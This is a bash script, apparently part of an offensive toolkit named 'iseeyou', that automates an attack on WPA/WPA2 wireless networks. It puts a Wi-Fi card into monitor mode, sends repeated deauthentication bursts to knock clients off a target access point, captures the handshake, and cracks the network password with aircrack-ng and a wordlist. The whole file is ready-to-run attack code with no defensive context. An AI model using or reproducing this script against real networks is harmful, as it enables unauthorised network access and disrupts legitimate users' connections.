#!/bin/bash

# WPA/WPA2 Handshake Capture and Cracking Script with Enhanced Security

set -euo pipefail

# Configuration
LOG_FILE="/var/log/iseeyou_attacks.log"
INTERFACE="wlan0"
MONITOR_INTERFACE="${INTERFACE}mon"
CAPTURE_DURATION=300  # 5 minutes capture time
OUTPUT_DIR="/tmp/iseeyou_captures"
HANDSHAKE_FILE="${OUTPUT_DIR}/handshake"

# Logging function
log() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') [WPA_CRACK] $*" | tee -a "$LOG_FILE"
}

# Cleanup function
cleanup() {
    log "Cleaning up and stopping capture..."
    # Stop monitor mode
    sudo airmon-ng stop "$MONITOR_INTERFACE" 2>/dev/null || true
    # Kill any remaining processes
    pkill -f "airodump-ng.*$MONITOR_INTERFACE" 2>/dev/null || true
    pkill -f "aireplay-ng.*$MONITOR_INTERFACE" 2>/dev/null || true
    log "Cleanup completed"
}

# Trap for cleanup on exit
trap cleanup EXIT INT TERM

# Validate MAC address
validate_mac() {
    local mac=$1
    if [[ ! $mac =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        log "ERROR: Invalid MAC address format: $mac"
        exit 1
    fi
}

# Validate channel
validate_channel() {
    local channel=$1
    if ! [[ "$channel" =~ ^[0-9]+$ ]] || [ "$channel" -lt 1 ] || [ "$channel" -gt 165 ]; then
        log "ERROR: Invalid channel: $channel"
        exit 1
    fi
}

# Validate wordlist file
validate_wordlist() {
    local wordlist=$1
    if [ ! -f "$wordlist" ]; then
        log "ERROR: Wordlist file not found: $wordlist"
        exit 1
    fi
    if [ ! -r "$wordlist" ]; then
        log "ERROR: Wordlist file not readable: $wordlist"
        exit 1
    fi
    local lines=$(wc -l < "$wordlist")
    if [ "$lines" -eq 0 ]; then
        log "ERROR: Wordlist file is empty: $wordlist"
        exit 1
    fi
    log "Wordlist validated: $lines entries"
}

# Check if required tools are installed
check_dependencies() {
    local tools=("aireplay-ng" "aircrack-ng" "airmon-ng" "iwconfig")
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            log "ERROR: Required tool not found: $tool"
            exit 1
        fi
    done
    log "All required tools are available"
}

# Function to capture handshake with advanced timing
capture_handshake() {
    local target_bssid=$1
    local target_channel=$2
    local capture_duration=$3
    local deauth_interval=$4

    log "Starting advanced handshake capture for BSSID: $target_bssid, Channel: $target_channel"

    # Clean up any existing capture files
    rm -f "${HANDSHAKE_FILE}"*

    # Check if interface exists
    if ! iwconfig "$INTERFACE" &>/dev/null; then
        log "ERROR: Wireless interface $INTERFACE not found"
        exit 1
    fi

    # Stop any existing monitor mode
    sudo airmon-ng stop "$MONITOR_INTERFACE" 2>/dev/null || true

    # Put the wireless interface in monitor mode
    log "Putting wireless interface $INTERFACE in monitor mode..."
    if ! sudo airmon-ng start "$INTERFACE"; then
        log "ERROR: Failed to start monitor mode on $INTERFACE"
        exit 1
    fi

    # Wait for interface to be ready
    sleep 2

    # Change to the target channel
    log "Changing channel to $target_channel..."
    if ! sudo iwconfig "$MONITOR_INTERFACE" channel "$target_channel"; then
        log "ERROR: Failed to set channel $target_channel"
        exit 1
    fi

    # Start handshake capture in background
    log "Starting handshake capture (duration: ${capture_duration}s)..."
    sudo timeout "$capture_duration" airodump-ng \
        --bssid "$target_bssid" \
        --channel "$target_channel" \
        --write "$HANDSHAKE_FILE" \
        "$MONITOR_INTERFACE" &
    capture_pid=$!

    # Intelligent deauthentication with timing
    log "Starting intelligent deauthentication (interval: ${deauth_interval}s)..."
    sleep 5  # Wait for airodump to start

    local start_time=$(date +%s)
    local deauth_count=0

    while [ $(($(date +%s) - start_time)) -lt "$((capture_duration - 10))" ]; do
        # Send deauth packets
        if sudo aireplay-ng --deauth 3 -a "$target_bssid" "$MONITOR_INTERFACE" 2>/dev/null; then
            deauth_count=$((deauth_count + 1))
            log "Deauth burst $deauth_count sent successfully"
        else
            log "WARNING: Deauth burst $deauth_count failed"
        fi

        # Wait for next deauth interval
        sleep "$deauth_interval"
    done

    # Wait for capture to complete
    if wait "$capture_pid" 2>/dev/null; then
        log "Handshake capture completed"
    else
        log "Handshake capture interrupted"
    fi

    log "Deauthentication summary: $deauth_count bursts sent"

    # Check if handshake was captured
    if [ -f "${HANDSHAKE_FILE}-01.cap" ]; then
        log "Capture file created: ${HANDSHAKE_FILE}-01.cap"
        return 0
    else
        log "ERROR: No capture file was created"
        return 1
    fi
}

# Function to capture handshake on multiple channels
capture_handshake_multi_channel() {
    local target_bssid=$1
    local primary_channel=$2
    local capture_duration=$3
    local deauth_interval=$4

    log "Starting multi-channel handshake capture"
    log "Primary channel: $primary_channel, Target: $target_bssid"

    # Define channel hopping sequence (common channels around primary)
    local channels=("$primary_channel")
    case $primary_channel in
        1) channels+=(6 11) ;;
        6) channels+=(1 11) ;;
        11) channels+=(6 1) ;;
        *) channels+=(1 6 11) ;;  # Default for other channels
    esac

    log "Channel hopping sequence: ${channels[*]}"

    # Clean up any existing capture files
    rm -f "${HANDSHAKE_FILE}"*

    # Check if interface exists
    if ! iwconfig "$INTERFACE" &>/dev/null; then
        log "ERROR: Wireless interface $INTERFACE not found"
        exit 1
    fi

    # Stop any existing monitor mode
    sudo airmon-ng stop "$MONITOR_INTERFACE" 2>/dev/null || true

    # Put the wireless interface in monitor mode
    if ! sudo airmon-ng start "$INTERFACE"; then
        log "ERROR: Failed to start monitor mode on $INTERFACE"
        exit 1
    fi

    sleep 2

    # Start multi-channel capture
    log "Starting multi-channel capture..."
    local channel_time=$((capture_duration / ${#channels[@]}))
    local capture_pid=""

    for channel in "${channels[@]}"; do
        log "Capturing on channel $channel for ${channel_time}s"

        # Change channel
        sudo iwconfig "$MONITOR_INTERFACE" channel "$channel"

        # Start capture on this channel
        sudo timeout "$channel_time" airodump-ng \
            --bssid "$target_bssid" \
            --channel "$channel" \
            --write "${HANDSHAKE_FILE}_ch${channel}" \
            "$MONITOR_INTERFACE" &
        capture_pid=$!

        # Deauth on this channel
        sudo aireplay-ng --deauth 2 -a "$target_bssid" "$MONITOR_INTERFACE" 2>/dev/null || true

        # Wait for channel capture to complete
        wait "$capture_pid" 2>/dev/null || true
    done

    # Merge capture files if they exist
    local merge_files=()
    for channel in "${channels[@]}"; do
        if [ -f "${HANDSHAKE_FILE}_ch${channel}-01.cap" ]; then
            merge_files+=("${HANDSHAKE_FILE}_ch${channel}-01.cap")
        fi
    done

    if [ ${#merge_files[@]} -gt 0 ]; then
        log "Merging ${#merge_files[@]} capture files..."
        if command -v mergecap &> /dev/null; then
            mergecap -w "${HANDSHAKE_FILE}-01.cap" "${merge_files[@]}"
            log "Capture files merged successfully"
        else
            # Fallback: use first file if mergecap not available
            cp "${merge_files[0]}" "${HANDSHAKE_FILE}-01.cap"
            log "Mergecap not available, using first capture file"
        fi

        # Clean up individual channel files
        for file in "${merge_files[@]}"; do
            rm -f "$file"
        done

        return 0
    else
        log "ERROR: No capture files were created"
        return 1
    fi
}

# Function to crack WPA/WPA2 password with advanced techniques
crack_password_advanced() {
    local handshake_file=$1
    local wordlist=$2
    local target_bssid=$3

    log "Starting advanced password cracking using wordlist: $wordlist"

    # Check if capture file exists
    if [ ! -f "${handshake_file}-01.cap" ]; then
        log "ERROR: Handshake capture file not found"
        return 1
    fi

    # Validate handshake file contains actual handshake
    log "Validating handshake file..."
    if ! aircrack-ng "${handshake_file}-01.cap" 2>/dev/null | grep -q "handshake"; then
        log "WARNING: No valid handshake found in capture file"
        log "Attempting to continue anyway..."
    else
        log "Valid handshake detected in capture file"
    fi

    # Get wordlist statistics
    local wordlist_lines=$(wc -l < "$wordlist" 2>/dev/null || echo "0")
    local wordlist_size=$(du -h "$wordlist" 2>/dev/null | cut -f1 || echo "unknown")

    log "Wordlist statistics: $wordlist_lines passwords, size: $wordlist_size"

    # Start cracking process with enhanced options
    log "Running aircrack-ng with optimized settings..."
    local start_time=$(date +%s)

    # Use advanced aircrack-ng options for better performance
    if sudo aircrack-ng \
        -w "$wordlist" \
        -b "$target_bssid" \
        --ignore-negative-one \
        "${handshake_file}-01.cap" \
        2>&1; then

        local end_time=$(date +%s)
        local duration=$((end_time - start_time))

        log "Password cracking completed in ${duration}s"

        # Check if password was found
        if grep -q "KEY FOUND" /tmp/aircrack_output.log 2>/dev/null; then
            log "SUCCESS: Password found!"
            return 0
        else
            log "No password found in wordlist"
            return 1
        fi
    else
        local exit_code=$?
        local end_time=$(date +%s)
        local duration=$((end_time - start_time))

        log "Password cracking interrupted after ${duration}s (exit code: $exit_code)"
        return 1
    fi
}

# Main script
main() {
    # Check if running as root
    if [ "$EUID" -ne 0 ]; then
        log "ERROR: This script must be run as root (sudo)"
        exit 1
    fi

    # Check dependencies
    check_dependencies

    # Validate arguments
    if [ $# -lt 3 ]; then
        log "Usage: $0 <target_bssid> <target_channel> <wordlist> [capture_duration] [deauth_interval] [output_dir] [multi_channel]"
        log "Example: $0 00:11:22:33:44:55 6 /usr/share/wordlists/rockyou.txt 600 30 /tmp/captures true"
        exit 1
    fi

    local target_bssid=$1
    local target_channel=$2
    local wordlist=$3

    # Advanced optional parameters
    local capture_duration=${4:-$CAPTURE_DURATION}
    local deauth_interval=${5:-30}
    local output_dir=${6:-$OUTPUT_DIR}
    local multi_channel=${7:-"false"}

    # Validate parameters
    if ! [[ "$capture_duration" =~ ^[0-9]+$ ]] || [ "$capture_duration" -lt 30 ]; then
        log "ERROR: Invalid capture duration: $capture_duration (minimum 30 seconds)"
        exit 1
    fi

    if ! [[ "$deauth_interval" =~ ^[0-9]+$ ]] || [ "$deauth_interval" -lt 5 ] || [ "$deauth_interval" -gt 300 ]; then
        log "ERROR: Invalid deauth interval: $deauth_interval (5-300 seconds)"
        exit 1
    fi

    # Validate inputs
    validate_mac "$target_bssid"
    validate_channel "$target_channel"
    validate_wordlist "$wordlist"

    # Create output directory
    mkdir -p "$output_dir"
    HANDSHAKE_FILE="${output_dir}/handshake"

    # Execute advanced capture
    if [ "$multi_channel" = "true" ]; then
        log "Using multi-channel capture mode"
        if capture_handshake_multi_channel "$target_bssid" "$target_channel" "$capture_duration" "$deauth_interval"; then
            log "Multi-channel handshake capture successful, starting password cracking..."
            crack_password_advanced "$HANDSHAKE_FILE" "$wordlist" "$target_bssid"
        else
            log "ERROR: Multi-channel handshake capture failed"
            exit 1
        fi
    else
        log "Using single-channel capture mode"
        if capture_handshake "$target_bssid" "$target_channel" "$capture_duration" "$deauth_interval"; then
            log "Handshake capture successful, starting password cracking..."
            crack_password_advanced "$HANDSHAKE_FILE" "$wordlist" "$target_bssid"
        else
            log "ERROR: Handshake capture failed"
            exit 1
        fi
    fi
}

# Run main function
main "$@"